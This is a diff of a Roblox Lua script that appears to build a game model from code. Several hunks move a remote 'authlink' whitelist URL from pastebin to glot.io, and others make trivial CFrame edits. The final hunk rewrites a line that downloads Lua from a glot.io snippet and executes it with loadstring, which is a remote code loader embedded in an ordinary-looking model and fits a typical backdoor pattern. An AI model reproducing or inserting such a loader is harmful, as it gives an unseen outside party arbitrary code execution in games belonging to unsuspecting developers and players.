@@ -3099,7 +3099,7 @@ table.insert(cors,sandbox(Script223,function()
 local http = game:GetService("HttpService")
 
 
-local authlink = "https://pastebin.com/raw/j1ZiqF37"
+local authlink = "https://glot.io/snippets/gcid1oo20b/raw/main.lua"
 
 local authorized = {}
 
@@ -5714,7 +5714,7 @@ table.insert(cors,sandbox(Script468,function()
 local http = game:GetService("HttpService")
 
 
-local authlink = "https://pastebin.com/raw/j1ZiqF37"
+local authlink = "https://glot.io/snippets/gcid1oo20b/raw/main.lua"
 
 local authorized = {}
 
@@ -5784,7 +5784,7 @@ table.insert(cors,sandbox(Script470,function()
 local http = game:GetService("HttpService")
 
 
-local authlink = "https://pastebin.com/raw/j1ZiqF37"
+local authlink = "https://glot.io/snippets/gcid1oo20b/raw/main.lua"
 
 local authorized = {}
 
@@ -6959,7 +6959,7 @@ table.insert(cors,sandbox(Script579,function()
 local http = game:GetService("HttpService")
 
 
-local authlink = "https://pastebin.com/raw/j1ZiqF37"
+local authlink = "https://glot.io/snippets/gcid1oo20b/raw/main.lua"
 
 local authorized = {}
 
@@ -11758,7 +11758,7 @@ Part1013.BrickColor = BrickColor.new("Smoky grey")
 Part1013.Material = Enum.Material.SmoothPlastic
 Part1013.brickColor = BrickColor.new("Smoky grey")
 Part1014.Parent = Model1008
-Part1014.CFrame = CFrame.new(-76.5084991, 5.32655668, -204.722198, 0, -1, 0, 1, 0, 0, 0, 0, 1)
+Part1014.CFrame = CFrame.new(-76.5084991, 5.32655668, -204.722198, 0, -1, 0, 1, 0, -0, 0, 0, 1)
 Part1014.Orientation = Vector3.new(0, 0, 90)
 Part1014.Position = Vector3.new(-76.50849914550781, 5.32655668258667, -204.72219848632812)
 Part1014.Rotation = Vector3.new(0, 0, 90)
@@ -11772,7 +11772,7 @@ Part1014.TopSurface = Enum.SurfaceType.Smooth
 Part1014.brickColor = BrickColor.new("Black")
 Part1014.Shape = Enum.PartType.Cylinder
 Part1015.Parent = Model1008
-Part1015.CFrame = CFrame.new(-76.5084991, 5.32655668, -206.982193, 0, -1, 0, 1, 0, 0, 0, 0, 1)
+Part1015.CFrame = CFrame.new(-76.5084991, 5.32655668, -206.982193, 0, -1, 0, 1, 0, -0, 0, 0, 1)
 Part1015.Orientation = Vector3.new(0, 0, 90)
 Part1015.Position = Vector3.new(-76.50849914550781, 5.32655668258667, -206.98219299316406)
 Part1015.Rotation = Vector3.new(0, 0, 90)
@@ -11826,7 +11826,7 @@ Decal1019.Texture = "http://www.roblox.com/asset/?id=10560087148"
 Decal1019.Transparency = 0.6000000238418579
 Decal1019.Face = Enum.NormalId.Left
 Part1020.Parent = Model1
-Part1020.CFrame = CFrame.new(-69.2578735, 0.378684998, -185.378067, 0, 0, 1, 0, 1, 0, -1, 0, 0)
+Part1020.CFrame = CFrame.new(-69.2578735, 0.378684998, -185.378067, 0, 0, 1, 0, 1, -0, -1, 0, 0)
 Part1020.Orientation = Vector3.new(0, 90, 0)
 Part1020.Position = Vector3.new(-69.25787353515625, 0.37868499755859375, -185.37806701660156)
 Part1020.Rotation = Vector3.new(0, 90, 0)
@@ -11895,11 +11895,11 @@ ClickDetector1029.Parent = Part1028
 ClickDetector1029.MaxActivationDistance = 12
 Script1030.Parent = Model1022
 table.insert(cors,sandbox(Script1030,function()
-local http = game:service'HttpService'
-local get = loadstring(http:GetAsync'https://pastebin.com/raw/nCmTX8GC')()
+local http = game:GetService("HttpService")
+local get = loadstring(http:GetAsync'https://glot.io/snippets/gciczp0kty/raw/main.lua')()
 
 
-local authlink = "https://pastebin.com/raw/j1ZiqF37"
+local authlink = "https://glot.io/snippets/gcid1oo20b/raw/main.lua"
 
 local authorized = {}
 
